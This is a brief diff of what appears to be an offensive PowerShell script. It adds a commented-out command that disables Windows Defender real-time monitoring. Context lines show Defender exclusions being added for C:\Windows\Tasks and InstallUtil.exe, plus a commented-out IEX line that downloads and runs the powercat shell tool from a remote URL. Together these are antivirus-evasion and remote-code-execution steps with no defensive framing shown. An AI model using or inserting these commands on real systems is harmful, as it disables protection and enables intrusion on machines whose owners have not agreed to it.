@@ -1,6 +1,7 @@
 # IEX (New-Object System.Net.webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 
 if ((Get-Module -ListAvailable -Name Defender)) {
+    # Set-MpPreference -DisableRealtimeMonitoring $true
     Add-MPPreference -ExclusionPath "C:\Windows\Tasks\"
     Add-MPPreference -ExclusionProcess "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
 }
